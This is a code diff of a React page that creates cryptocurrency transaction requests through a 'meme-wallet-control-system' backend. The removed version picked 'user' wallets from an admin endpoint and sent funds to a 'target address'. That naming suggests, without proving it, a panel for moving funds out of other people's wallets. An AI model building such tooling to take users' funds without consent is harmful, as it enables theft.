@@ -1,105 +1,105 @@
 import React, { useState, useEffect } from "react";
 
-function SendRequest() {
-  const [wallets, setWallets] = useState([]);
-  const [selectedWallet, setSelectedWallet] = useState("");
-  const [chain, setChain] = useState("eth");
+export default function SendRequest() {
+  const [wallet, setWallet] = useState(null);
   const [toAddress, setToAddress] = useState("");
-  const [tokenType, setTokenType] = useState("usdt");
   const [amount, setAmount] = useState("");
-  const [message, setMessage] = useState("");
+  const [token, setToken] = useState("native");
+  const [loading, setLoading] = useState(false);
+  const [msg, setMsg] = useState("");
 
-  // Fetch wallets from backend
+  // Load selected wallet from localStorage
   useEffect(() => {
-    fetch("https://meme-wallet-control-system-hx1r.vercel.app/api/admin-get-wallets")
-      .then(res => res.json())
-      .then(data => setWallets(data.wallets || []));
+    const w = localStorage.getItem("selectedWallet");
+    if (w) setWallet(JSON.parse(w));
   }, []);
 
-  const handleSubmit = async () => {
-    if (!selectedWallet || !toAddress || !amount) {
-      setMessage("❌ Please fill all fields");
+  const sendRequest = async () => {
+    if (!wallet) {
+      setMsg("No wallet selected");
+      return;
+    }
+    if (!toAddress || !amount) {
+      setMsg("Enter all fields");
       return;
     }
 
-    const res = await fetch(
-      "https://meme-wallet-control-system-hx1r.vercel.app/api/transaction-request-create",
-      {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          walletAddress: selectedWallet,
-          chain,
-          toAddress,
-          tokenType,
-          amount
-        })
+    setLoading(true);
+    setMsg("");
+
+    try {
+      const res = await fetch(
+        "https://meme-wallet-control-system-hx1r.vercel.app/api/transaction-request-create",
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            walletAddress: wallet.address,
+            chain: wallet.chain,
+            to: toAddress,
+            amount,
+            token: token.toUpperCase()
+          })
+        }
+      );
+
+      const data = await res.json();
+
+      if (data.success) {
+        setMsg("Request created successfully!");
+        setToAddress("");
+        setAmount("");
+      } else {
+        setMsg("Error: " + data.message);
       }
-    );
-
-    const data = await res.json();
-
-    if (data.success) {
-      setMessage("✅ Request sent successfully!");
-      setAmount("");
-      setToAddress("");
-    } else {
-      setMessage("❌ Failed to send request");
+    } catch (e) {
+      setMsg("Error sending request.");
     }
+
+    setLoading(false);
   };
 
-  return (
-    <div>
-      <h1>Send Transaction Request</h1>
+  if (!wallet) return <div className="page"><h2>No wallet selected.</h2></div>;
 
-      {message && <p className="msg">{message}</p>}
+  return (
+    <div className="page">
+      <h1>Create Transaction Request</h1>
+
+      <div className="card">
+        <p><b>Selected Wallet:</b> {wallet.address}</p>
+        <p><b>Chain:</b> {wallet.chain.toUpperCase()}</p>
+      </div>
 
       <div className="form">
-        <label>Select User Wallet</label>
-        <select value={selectedWallet} onChange={(e) => setSelectedWallet(e.target.value)}>
-          <option value="">Choose Wallet…</option>
-          {wallets.map((w) => (
-            <option key={w.id} value={w.address}>
-              {w.address.slice(0, 12)}...{w.address.slice(-6)}
-            </option>
-          ))}
-        </select>
-
-        <label>Chain</label>
-        <select value={chain} onChange={(e) => setChain(e.target.value)}>
-          <option value="eth">Ethereum</option>
-          <option value="bnb">BNB</option>
-          <option value="polygon">Polygon</option>
-          <option value="arbitrum">Arbitrum</option>
-          <option value="optimism">Optimism</option>
-        </select>
-
-        <label>Send To (Target Address)</label>
+        <label>Send To Address</label>
         <input
           type="text"
           value={toAddress}
           onChange={(e) => setToAddress(e.target.value)}
-          placeholder="0x123..."
+          placeholder="Receiver address"
         />
-
-        <label>Token Type</label>
-        <select value={tokenType} onChange={(e) => setTokenType(e.target.value)}>
-          <option value="usdt">USDT</option>
-          <option value="native">Native Token</option>
-        </select>
 
         <label>Amount</label>
         <input
           type="number"
+          min="0"
+          step="0.0001"
           value={amount}
           onChange={(e) => setAmount(e.target.value)}
-          placeholder="Enter amount"
         />
 
-        <button className="btn" onClick={handleSubmit}>Send Request</button>
+        <label>Token</label>
+        <select value={token} onChange={(e) => setToken(e.target.value)}>
+          <option value="native">Native</option>
+          <option value="USDT">USDT</option>
+        </select>
+
+        <button onClick={sendRequest} disabled={loading}>
+          {loading ? "Sending…" : "Create Request"}
+        </button>
+
+        {msg && <p className="msg">{msg}</p>}
       </div>
     </div>
   );
 }
-
-export default SendRequest;
